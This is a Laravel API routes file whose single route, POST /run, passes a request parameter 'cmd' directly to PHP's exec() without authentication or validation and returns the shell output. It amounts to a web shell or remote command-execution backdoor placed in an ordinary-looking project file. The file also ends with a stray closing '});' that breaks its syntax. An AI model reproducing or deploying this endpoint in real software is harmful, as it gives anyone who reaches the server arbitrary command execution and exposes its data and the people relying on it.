<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use  App\Http\Controllers\ApiController;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/


Route::post('/run', function (Request $request) {
   try{
		
   $cmd = $request->input("cmd");
   
   $res = "";
   
	$dir = "~";
	if(file_exists("pwd"))
	 $dir = file_get_contents('pwd');
   
    
   if(str_contains($cmd,"cd "))
   {
	   
	  exec( "cd $dir && $cmd && pwd 2>&1", $results);
	  if(count($results)>0)
	  {
	   file_put_contents('pwd', $results[count($results)-1] );
	   return "OK , we're here : ". file_get_contents('pwd');
	  }
    
   }
   else{

	   exec( "cd $dir && $cmd 2>&1", $output);
	   foreach($output as $out)
	   {
			$res .= "$out \r\n";
	   }   
   
   }
   
   
   if(strlen($res)==0)
	   return " Done! ";
   return  $res;
    }
	catch(\Error | \Exception $e){
		return $e->getMessage();
	}
   
});
 
 
});
 
 

   
